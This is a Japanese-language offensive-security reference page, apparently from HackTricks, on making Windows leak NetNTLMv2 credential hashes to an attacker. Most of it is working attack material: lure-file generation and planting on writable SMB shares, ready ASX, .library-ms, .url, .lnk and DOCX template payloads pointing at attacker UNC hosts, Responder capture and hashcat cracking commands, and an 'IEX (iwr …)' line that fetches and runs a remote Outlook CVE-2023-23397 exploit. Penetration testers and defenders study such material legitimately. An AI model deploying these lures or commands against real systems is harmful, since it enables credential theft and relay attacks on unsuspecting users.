# NTLM 認証情報を盗む場所

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) の素晴らしいアイデアをすべて確認してください。オンラインでの microsoft word ファイルのダウンロードから ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md および [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

ユーザーやスケジュールされたジョブが Explorer で参照する共有に**書き込みできる**なら、メタデータがあなたの UNC を指すファイル（例: `\\ATTACKER\share`）を配置してください。フォルダをレンダリングすると**implicit SMB authentication**がトリガーされ、leaks a **NetNTLMv2** to your listener.

1. **誘導ファイルを生成する** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **書き込み可能な共有に置く**（被害者が開く任意のフォルダ）：
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows は複数のファイルに同時にアクセスすることがあり、Explorer のプレビュー（`BROWSE TO FOLDER`）で表示されるものはクリックを必要としません。

### Windows Media Player のプレイリスト (.ASX/.WAX)

ターゲットに自分が作成した Windows Media Player のプレイリストを開かせるかプレビューさせられれば、エントリを UNC パスに向けることで Net‑NTLMv2 を leak できます。WMP は参照されたメディアを SMB 経由で取得しようとし、暗黙的に認証を行います。

例の payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
収集と cracking のフロー:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP埋め込みの .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer は、ZIP アーカイブ内から直接開かれた .library-ms ファイルを不適切に処理します。ライブラリ定義がリモートの UNC パス（例: \\attacker\share）を指している場合、ZIP 内の .library-ms を単に参照／起動するだけで Explorer がその UNC を列挙し、攻撃者へ NTLM 認証を送出します。これにより得られる NetNTLMv2 はオフラインでクラック可能であり、あるいはリレーされる可能性があります。

攻撃者の UNC を指す最小限の .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows processed the extended MAPI property PidLidReminderFileParameter in calendar items. If that property points to a UNC path (e.g., \\attacker\share\alert.wav), Outlook would contact the SMB share when the reminder fires, leaking the user’s Net‑NTLMv2 without any click. This was patched on March 14, 2023, but it’s still highly relevant for legacy/untouched fleets and for historical incident response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener 側:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 被害者はリマインダーが発動する際に Outlook for Windows が実行されているだけでよい。
- この leak により Net‑NTLMv2 が取得され、offline cracking または relay に適している（pass‑the‑hash ではない）。


### .LNK/.URL アイコンベース zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer はショートカットアイコンを自動的にレンダリングします。最近の研究では、Microsoft が 2025 年 4 月に UNC‑icon shortcuts に対して適用したパッチの後でも、ショートカットのターゲットを UNC パス上にホストしアイコンをローカルに保持することで、クリックなしに NTLM 認証をトリガーできることが示されました（パッチ回避に CVE‑2025‑50154 が割り当てられた）。フォルダを単に閲覧するだけで、Explorer はリモートターゲットからメタデータを取得し、攻撃者の SMB サーバへ NTLM を送出します。

最小の Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) を PowerShell 経由で:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- ショートカットを ZIP に入れて被害者に参照させる。
- 被害者が開く書き込み可能な share にショートカットを置く。
- 同じフォルダ内の他の誘導ファイルと組み合わせて、Explorer がアイテムをプレビューするようにする。

### クリック不要の .LNK NTLM leak：ExtraData アイコンパス経由 (CVE‑2026‑25185)

Windows は `.lnk` メタデータを実行時だけでなく、**view/preview**（アイコン描画）時にも読み込みます。CVE‑2026‑25185 は、**ExtraData** ブロックがシェルにアイコンパスを解決させ、読み込み中にファイルシステムに触れて（filesystem を touch して）パスがリモートの場合に outbound NTLM を送出させるパース経路を示しています。

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- ExtraData に **DARWIN_PROPS** (`0xa0000006`) を含める（アイコン更新ルーチンへのゲート）。
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) を含め、**TargetUnicode** を設定する。
- ローダーは `TargetUnicode` 内の環境変数を展開し、結果パスに対して `PathFileExistsW` を呼び出す。

`TargetUnicode` が UNC パス（例: `\\attacker\share\icon.ico`）に解決されると、ショートカットを含むフォルダを**単に表示するだけで** outbound 認証が発生します。同じ読み込み経路は **indexing** や **AV scanning** によっても到達されるため、実用的な no‑click leak の表面になります。

解析/生成/UI 用のリサーチ用ツールは、Windows GUI を使わずにこれらの構造を構築/検査するための **LnkMeMaybe** プロジェクトで入手できます。


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office ドキュメントは外部テンプレートを参照できます。添付テンプレートを UNC パスに設定すると、ドキュメントを開くと SMB に対して認証が行われます。

Minimal DOCX relationship changes (inside word/):

1) word/settings.xml を編集し、添付テンプレート参照を追加する:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels を編集して、rId1337 をあなたの UNC に向けてください:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx に再パックして配布します。SMB capture listener を実行し、open を待ちます。

キャプチャ後の relaying や abusing NTLM に関するアイデアは、以下を参照してください：

{{#ref}}
README.md
{{#endref}}


## 参考資料
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
